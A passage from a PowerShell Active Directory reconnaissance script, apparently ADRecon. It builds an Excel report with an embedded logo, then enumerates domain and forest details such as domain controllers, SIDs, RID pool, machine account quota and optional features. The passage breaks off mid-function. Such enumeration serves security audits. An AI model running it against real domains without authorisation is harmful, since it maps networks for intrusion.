VhvNu2qKe3lkgmjb+KOWJldG+asD1XPvH+Tp/Lo3pVz5Cq+O2PwFfUSCR5tnb27G2pSINTO0cGDw27abblPG5a1ko1IFgpA9gq59s+Srpi7WSo5/geVB/vKuFH+89ZY7B9/v72PL0C2sHNkt1bIKAXVpYXLHFKmaW1adiPnKanJr024T+S9/LcwpgkPx5bL1UBmIqs32j3DXCUTLImmegXf0GHmESSWS9NdSA19YDe24va/keKh+i1MPNpZj/AC8TT/L+fSzcf7wj73G46k/rX4ELU7Ydu2pKUoe1/ojKKkZ/UzkfCadHS6b+L/x2+PYqG6U6W6561rK2jfH1+Z2vtfGUO48lj5J4KpsflNzGCTcGTofuaWKQQz1MkYeNWCggH2KNs2DZdmr+6rWCBiKFkQBiONC3xEVANCSOseef/eX3X91Cg9xOYd23i3jkDpFc3MjwRuFZdcdvUQRvpZl1pGrEMQTQnod/Zv1GnXvfuvdV7/zVdwbO29/L9+Tcm9aynpaHL7Al2/hIpmi81fvHMZPH02z6OjgkOuoqP7wmnmYIGaOCGSU2WNmAN9wZraHk6/N0QEaHSvzdiAgHr3UPyAJ8usp/uT7Xv+6/ek5OTl2NnuYN0E8xFaJaxRu107kYVfA1qK0DOypkuAfn1e8N+vqY62vf+E7fxxOJ2d2/8ps7QBK3dtdF1JsCpmjVZxt3BS0ee3zX07NEWehzG4GxtKrK4/exEyspsp95Dey2yeHbXPMEo7pD4MZ/orRpCPkW0j7UPXEH+9c92vrt/wBh9lttlrb2ER3O9UHHjzB4bNGFcPFB48hBHwXUZB4jrZg9zp1x+697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3XugS+SXbdT0L0F3B3TSYSDctV1f19ube0G36mukxkGYl2/jZ69MfNkIqatkoo6ow6TIsUhS99J+nsq3zcW2jZ7ndFQSNbws+kmmrSK0rQ0r60PUi+0XIsXud7n7B7eT3LWcO9brb2bTqgkaITyBDIELIHK1rpLLXhUdav8Au7/hRr31X0s8Wxvj31LtmqdFWCq3Pnt37zSAmORZJDTY2fZIlfylWS7hVCkMGvcQLc+9m7upFpZW0berM7/yGjrsvsX90x7ZW0yvzJzVvl5ADlbeG1tC2RQapBeUFKg4qaggrTNQXyk+b3yU+Y2Xoch3p2HV57E4aokqdu7KxFJTbf2Nt2eSN4XqcbtzGpFTT5IwyvGa6saqrzExjM5jsojbf+a985mkD7tMXjU1VAAsa/MKMV/pNVqYrTrPH2X+7l7Q+wNhLa+221JbX1woWe7lZp7ycAghZJ5CWEdQG8GIRw6gGEeqpIGdV9Xb67q7D2j1X1pt+t3Rvje+apMFt/DUKFnnqqp/3KmqmP7NBi8dTq9RWVcxSnpKWKSaVkjRmBTt9hd7pex7fYoZLuVwqqPU+Z9ABlicAAk4HUk8686cte3fKl/zrzhdR2XLe227TTyucBVGFUcXkkakcUSgvLIyxorOwB+jD8W+iML8ZPj51N0VgpYKun662hj8PkcnTwGmizm5J/Jkt2bhWnYs8Az+566rrBGxZoxMFJNr+81tg2iLYdmttpiIKwRBSRjU3F2/2zkt+fXyce9HuZuHvF7p757lbkrRy7tfvKkbHUYbcUjtoC3A+BbpFFUABtFaCtOh89nHUYde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3RMv5if8A2Qn8tf8AxAvY/wD7zlb7DHOv/Kpbj/zxy/8AHT1kF91H/wASW5G/8Wew/wCr6dfPV2xsreW9q5MZszaW5t3ZKWWOCLH7YwOVz9dJPNq8UKUmKpauoeWXSdKhbtY294Z29rdXT+HaxySP6IpY/sAPX1S7zzFy/wAuWxvOYb6zsLRVLF7iaOBABxJaVlUAeZrQdWZfHX+TV84+/K2iqMr1xJ0bs+Yo9XurucVW1auKC4aRKLYwp6nfVXXNCCYVmoKWldrB6iIHUB3svtjzXvDgyQfSWx4vPVD+UdDIT6VUD1YdYe+7H94F92/2wt5IrHdxzJv61C2206blSfIveals1SvxFZpJAKlYnIodrj4K/wAtnof4KYWpqtnpVb57XztAuP3X25uakpoM3W0ReGabC7axUElTS7Q2zLVQLK1LFLPUTuqfc1NR4ofHkLylyPtHKURa2rLuLijzMBqI/hUZCLXNASTjUzUFOIn3lfvd+5n3ldxSHfym28kW0uu22y3ZjCj0IE1xIQrXVwFJUSMqIgLeDDFrk12G+xn1ir1737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+690n91f8AHu5b/qFP/Q6e2Z/7Fvs6M9m/5KkH+n6UHt7os697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuv/9k="

        $bytes = [System.Convert]::FromBase64String($base64sos)
        Remove-Variable base64sos

        $CompanyLogo = -join($ReportPath,'\','SOS_Logo.jpg')
		$p = New-Object IO.MemoryStream($bytes, 0, $bytes.length)
		$p.Write($bytes, 0, $bytes.length)
        Add-Type -AssemblyName System.Drawing
		$picture = [System.Drawing.Image]::FromStream($p, $true)
		$picture.Save($CompanyLogo)

        Remove-Variable bytes
        Remove-Variable p
        Remove-Variable picture

        $LinkToFile = $false
        $SaveWithDocument = $true
        $Left = 0
        $Top = 0
        $Width = 135
        $Height = 50

        # Add image to the Sheet
        $worksheet.Shapes.AddPicture($CompanyLogo, $LinkToFile, $SaveWithDocument, $Left, $Top, $Width, $Height) | Out-Null

        Remove-Variable LinkToFile
        Remove-Variable SaveWithDocument
        Remove-Variable Left
        Remove-Variable Top
        Remove-Variable Width
        Remove-Variable Height

        If (Test-Path -Path $CompanyLogo)
        {
            Remove-Item $CompanyLogo
        }
        Remove-Variable CompanyLogo

        $row = 5
        $column = 1
        $worksheet.Cells.Item($row,$column)= "Table of Contents"
        $worksheet.Cells.Item($row,$column).Style = "Heading 2"
        $row++

        For($i=2; $i -le $workbook.Worksheets.Count; $i++)
        {
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item($row,$column) , "" , "'$($workbook.Worksheets.Item($i).Name)'!A1", "", $workbook.Worksheets.Item($i).Name) | Out-Null
            $row++
        }

        $row++
        $worksheet.Cells.Item($row, 1) = "© Sense of Security 2018"
        $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item($row,2) , "https://www.senseofsecurity.com.au", "" , "", "www.senseofsecurity.com.au") | Out-Null

        $worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null

        $excel.Windows.Item(1).Displaygridlines = $false
        $excel.ScreenUpdating = $true
        $ADStatFileName = -join($ExcelPath,'\',$DomainName,'ADRecon-Report.xlsx')
        Try
        {
            # Disable prompt if file exists
            $excel.DisplayAlerts = $False
            $workbook.SaveAs($ADStatFileName)
            Write-Output "[+] Excelsheet Saved to: $ADStatFileName"
        }
        Catch
        {
            Write-Error "[EXCEPTION] $($_.Exception.Message)"
        }
        $excel.Quit()
        Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet -Final $true
        Remove-Variable worksheet
        Get-ADRExcelComObjRelease -ComObjtoRelease $workbook -Final $true
        Remove-Variable -Name workbook -Scope Global
        Get-ADRExcelComObjRelease -ComObjtoRelease $excel -Final $true
        Remove-Variable -Name excel -Scope Global
    }
}

Function Get-ADRDomain
{
<#
.SYNOPSIS
    Returns information of the current (or specified) domain.

.DESCRIPTION
    Returns information of the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning "[Get-ADRDomain] Error getting Domain Context"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        If ($ADDomain)
        {
            $DomainObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            $FLAD = @{
	            0 = "Windows2000";
	            1 = "Windows2003/Interim";
	            2 = "Windows2003";
	            3 = "Windows2008";
	            4 = "Windows2008R2";
	            5 = "Windows2012";
	            6 = "Windows2012R2";
	            7 = "Windows2016"
            }
            $DomainMode = $FLAD[[convert]::ToInt32($ADDomain.DomainMode)] + "Domain"
            Remove-Variable FLAD
            If (-Not $DomainMode)
            {
                $DomainMode = $ADDomain.DomainMode
            }

            $ObjValues = @("Name", $ADDomain.DNSRoot, "NetBIOS", $ADDomain.NetBIOSName, "Functional Level", $DomainMode, "DomainSID", $ADDomain.DomainSID.Value)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
                $i++
                $DomainObj += $Obj
            }
            Remove-Variable DomainMode

            For($i=0; $i -lt $ADDomain.ReplicaDirectoryServers.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Domain Controller"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADDomain.ReplicaDirectoryServers[$i]
                $DomainObj += $Obj
            }
            For($i=0; $i -lt $ADDomain.ReadOnlyReplicaDirectoryServers.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Read Only Domain Controller"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADDomain.ReadOnlyReplicaDirectoryServers[$i]
                $DomainObj += $Obj
            }

            Try
            {
                $ADForest = Get-ADForest $ADDomain.Forest
            }
            Catch
            {
                Write-Verbose "[Get-ADRDomain] Error getting Forest Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }

            If (-Not $ADForest)
            {
                Try
                {
                    $ADForest = Get-ADForest -Server $DomainController
                }
                Catch
                {
                    Write-Warning "[Get-ADRDomain] Error getting Forest Context"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
            }
            If ($ADForest)
            {
                $DomainCreation = Get-ADObject -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.Name)))" -Properties whenCreated
                If (-Not $DomainCreation)
                {
                    $DomainCreation = Get-ADObject -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.NetBIOSName)))" -Properties whenCreated
                }
                Remove-Variable ADForest
            }
            # Get RIDAvailablePool
            Try
            {
                $RIDManager = Get-ADObject -Identity "CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName)" -Properties rIDAvailablePool
                $RIDproperty = $RIDManager.rIDAvailablePool
                [int32] $totalSIDS = $($RIDproperty) / ([math]::Pow(2,32))
                [int64] $temp64val = $totalSIDS * ([math]::Pow(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName)"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
            If ($DomainCreation)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Creation Date"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $DomainCreation.whenCreated
                $DomainObj += $Obj
                Remove-Variable DomainCreation
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "ms-DS-MachineAccountQuota"
            $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $((Get-ADObject -Identity ($ADDomain.DistinguishedName) -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota')
            $DomainObj += $Obj

            If ($RIDsIssued)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "RIDs Issued"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $RIDsIssued
                $DomainObj += $Obj
                Remove-Variable RIDsIssued
            }
            If ($RIDsRemaining)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "RIDs Remaining"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $RIDsRemaining
                $DomainObj += $Obj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain",$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error getting Domain Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            Remove-Variable DomainContext
            # Get RIDAvailablePool
            Try
            {
                $SearchPath = "CN=RID Manager$,CN=System"
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath.PropertiesToLoad.AddRange(("ridavailablepool"))
                $objSearcherResult = $objSearcherPath.FindAll()
                $RIDproperty = $objSearcherResult.Properties.ridavailablepool
                [int32] $totalSIDS = $($RIDproperty) / ([math]::Pow(2,32))
                [int64] $temp64val = $totalSIDS * ([math]::Pow(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable SearchPath
                $objSearchPath.Dispose()
                $objSearcherPath.Dispose()
                $objSearcherResult.Dispose()
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName)"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Forest",$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error getting Forest Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
            If ($ForestContext)
            {
                Remove-Variable ForestContext
            }
            If ($ADForest)
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
            }
            If ($GlobalCatalog)
            {
                $DN = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($($DN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                    $ADObject.Dispose()
                }
                Catch
                {
                    Write-Warning "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain."
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
                }
            }
            Else
            {
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            Try
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
                $DN = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($DN)
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                $ADObject.dispose()
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain."
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
            # Get RIDAvailablePool
            Try
            {
                $RIDManager = ([ADSI]"LDAP://CN=RID Manager$,CN=System,$($objDomain.distinguishedName)")
                $RIDproperty = $ObjDomain.ConvertLargeIntegerToInt64($RIDManager.Properties.rIDAvailablePool.value)
                [int32] $totalSIDS = $($RIDproperty) / ([math]::Pow(2,32))
                [int64] $temp64val = $totalSIDS * ([math]::Pow(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName)"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
        }

        If ($ADDomain)
        {
            $DomainObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            $FLAD = @{
	            0 = "Windows2000";
	            1 = "Windows2003/Interim";
	            2 = "Windows2003";
	            3 = "Windows2008";
	            4 = "Windows2008R2";
	            5 = "Windows2012";
	            6 = "Windows2012R2";
	            7 = "Windows2016"
            }
            $DomainMode = $FLAD[[convert]::ToInt32($objDomainRootDSE.domainFunctionality,10)] + "Domain"
            Remove-Variable FLAD

            $ObjValues = @("Name", $ADDomain.Name, "NetBIOS", $objDomain.dc.value, "Functional Level", $DomainMode, "DomainSID", $ADDomainSID.Value)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
                $i++
                $DomainObj += $Obj
            }
            Remove-Variable DomainMode

            For($i=0; $i -lt $ADDomain.DomainControllers.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Domain Controller"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADDomain.DomainControllers[$i]
                $DomainObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Creation Date"
            $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $objDomain.whencreated.value
            $DomainObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "ms-DS-MachineAccountQuota"
            $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $objDomain.'ms-DS-MachineAccountQuota'.value
            $DomainObj += $Obj

            If ($RIDsIssued)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "RIDs Issued"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $RIDsIssued
                $DomainObj += $Obj
                Remove-Variable RIDsIssued
            }
            If ($RIDsRemaining)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "RIDs Remaining"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $RIDsRemaining
                $DomainObj += $Obj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If ($DomainObj)
    {
        Return $DomainObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRForest
{
<#
.SYNOPSIS
    Returns information of the current (or specified) forest.

.DESCRIPTION
    Returns information of the current (or specified) forest.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning "[Get-ADRForest] Error getting Domain Context"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        Try
        {
            $ADForest = Get-ADForest $ADDomain.Forest
        }
        Catch
        {
            Write-Verbose "[Get-ADRForest] Error getting Forest Context"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        Remove-Variable ADDomain

        If (-Not $ADForest)
        {
            Try
            {
                $ADForest = Get-ADForest -Server $DomainController
            }
            Catch
            {
                Write-Warning "[Get-ADRForest] Error getting Forest Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
        }

        If ($ADForest)
        {
            # Get Tombstone Lifetime
            Try
            {
                $ADForestCNC = (Get-ADRootDSE).configurationNamingContext
                $ADForestDSCP = Get-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,$($ADForestCNC)" -Partition $ADForestCNC -Properties *
                $ADForestTombstoneLifetime = $ADForestDSCP.tombstoneLifetime
                Remove-Variable ADForestCNC
                Remove-Variable ADForestDSCP
            }
            Catch
            {
                Write-Warning "[Get-ADRForest] Error retrieving Tombstone Lifetime"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }

            # Check Recycle Bin Feature Status
            If ([convert]::ToInt32($ADForest.ForestMode) -ge 6)
            {
                Try
                {
                    $ADRecycleBin = Get-ADOptionalFeature -Identity "Recycle Bin Feature"
                }
                Catch
                {
                    Write-Warning "[Get-ADRForest] Error retrieving Recycle Bin Feature"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
            }

            # Check Privileged Access Management Feature status
            If ([convert]::ToInt32($ADForest.ForestMode) -ge 7)
            {
                Try
                {
                    $PrivilegedAccessManagement = Get-ADOptionalFeature -Identity "Privileged Access Management Feature"
                }
                Catch
                {
                    Write-Warning "[Get-ADRForest] Error retrieving Privileged Acceess Management Feature"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
            }

            $ForestObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            $FLAD = @{
                0 = "Windows2000";
                1 = "Windows2003/Interim";
                2 = "Windows2003";
                3 = "Windows2008";
                4 = "Windows2008R2";
                5 = "Windows2012";
                6 = "Windows2012R2";
                7 = "Windows2016"
            }
            $ForestMode = $FLAD[[convert]::ToInt32($ADForest.ForestMode)] + "Forest"
            Remove-Variable FLAD

            If (-Not $ForestMode)
            {
                $ForestMode = $ADForest.ForestMode
            }

            $ObjValues = @("Name", $ADForest.Name, "Functional Level", $ForestMode, "Domain Naming Master", $ADForest.DomainNamingMaster, "Schema Master", $ADForest.SchemaMaster, "RootDomain", $ADForest.RootDomain, "Domain Count", $ADForest.Domains.Count, "Site Count", $ADForest.Sites.Count, "Global Catalog Count", $ADForest.GlobalCatalogs.Count)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
                $i++
                $ForestObj += $Obj
            }
            Remove-Variable ForestMode

            For($i=0; $i -lt $ADForest.Domains.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Domain"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForest.Domains[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.Sites.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Site"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForest.Sites[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.GlobalCatalogs.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "GlobalCatalog"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForest.GlobalCatalogs[$i]
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Tombstone Lifetime"
            If ($ADForestTombstoneLifetime)
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Not Retrieved"
            }
            $ForestObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Recycle Bin (2008 R2 onwards)"
            If ($ADRecycleBin)
            {
                If ($ADRecycleBin.EnabledScopes.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Enabled"
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($ADRecycleBin.EnabledScopes.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Enabled Scope"
                        $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADRecycleBin.EnabledScopes[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                    $ForestObj += $Obj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Privileged Access Management (2016 onwards)"
            If ($PrivilegedAccessManagement)
            {
                If ($PrivilegedAccessManagement.EnabledScopes.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Enabled"
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($PrivilegedAccessManagement.EnabledScopes.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Enabled Scope"
                        $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $PrivilegedAccessManagement.EnabledScopes[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                    $ForestObj += $Obj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
